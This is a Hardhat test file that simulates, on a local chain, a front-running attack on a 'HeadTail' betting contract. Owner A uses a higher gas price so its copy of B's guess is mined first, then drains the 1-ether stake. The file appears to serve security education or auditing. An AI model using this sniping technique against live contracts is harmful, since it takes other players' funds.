import { expect } from "chai";
import { network } from "hardhat";

const { ethers } = await network.connect();

/**
 * FRONT-RUNNING EXPLANATION
 *
 * Front-running occurs when an attacker observes a transaction in the mempool
 * and submits another transaction with a higher gas price so that it is mined first.
 *
 * In the HeadTail contract, the vulnerable function is:
 *
 *   function guess(bool _chooseHead) public payable
 *
 * Because:
 * - The guess is public
 * - The value is visible before being mined
 * - Anyone can race to become partyB
 *
 * Result:
 * An attacker can copy the guess transaction and submit it faster,
 * becoming partyB instead of the legitimate player.
 */

describe("HeadTail Front-Running Simulation (LOCAL ONLY)", function () {

  let contract: any;
  let ownerA: any;
  let playerB: any;

  const CHOICE_A = true;      // A chooses Head
  const RANDOM = 123456;      // Secret random
  const CHOICE_B = true;      // B guesses Head (would normally win)

  beforeEach(async () => {
    [ownerA, playerB] = await ethers.getSigners();

    const commitment = ethers.keccak256(
      ethers.solidityPacked(["bool", "uint256"], [CHOICE_A, RANDOM])
    );

    const HeadTail = await ethers.getContractFactory("HeadTail");

    contract = await HeadTail.connect(ownerA).deploy(commitment, {
      value: ethers.parseEther("1")
    });

    await contract.waitForDeployment();
  });

  it.only("Simulates front-running attack by Player A", async () => {

    // Disable automine so we can control transaction order
    await ethers.provider.send("evm_setAutomine", [false]);

    // STEP 1: B sends guess (this would make A lose)
    console.log("STEP 1 partyB=" + (await contract.partyB())); 
    const txB = await contract.connect(playerB).guess(CHOICE_B, {
      value: ethers.parseEther("1"),
      gasPrice: ethers.parseUnits("1", "gwei") // low priority
    });

    // STEP 2: A snipes by submitting his own guess with higher gas price
    console.log("STEP 2 partyB=" + (await contract.partyB())); 
    const txA = await contract.connect(ownerA).guess(CHOICE_B, {
      value: ethers.parseEther("1"),
      gasPrice: ethers.parseUnits("50", "gwei") // higher priority
    });

    // STEP 3: Mine block -> A goes first
    console.log("Mine block");
    await ethers.provider.send("evm_mine");

    // STEP 4: Re-enable automine
    await ethers.provider.send("evm_setAutomine", [true]);

    const partyB = await contract.partyB();
    console.log("partyB is:", partyB);

    // A successfully became partyB
    expect(partyB).to.equal(ownerA.address);

    // STEP 5: A resolves -> wins regardless
    await contract.connect(ownerA).resolve(CHOICE_A, RANDOM);

    const balance = await ethers.provider.getBalance(contract.getAddress());
    expect(balance).to.equal(0n);
  });

});